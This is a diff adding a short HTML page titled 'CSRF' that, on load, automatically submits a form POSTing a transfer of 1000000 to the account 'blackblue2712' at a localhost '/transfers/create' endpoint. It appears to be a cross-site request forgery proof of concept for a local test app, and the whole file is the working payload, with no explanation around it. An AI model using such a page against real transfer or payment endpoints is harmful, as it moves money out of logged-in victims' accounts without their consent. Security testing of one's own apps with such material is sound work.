@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>CSRF</title>
+</head>
+<body onload="document.transForm.submit()">
+	<form name="transForm" action="http://localhost:3000/transfers/create" method="POST">
+		<input type="text" name="account" value="blackblue2712">
+		<input name="money" type="number" value="1000000">
+	</form>
+</body>
+</html>
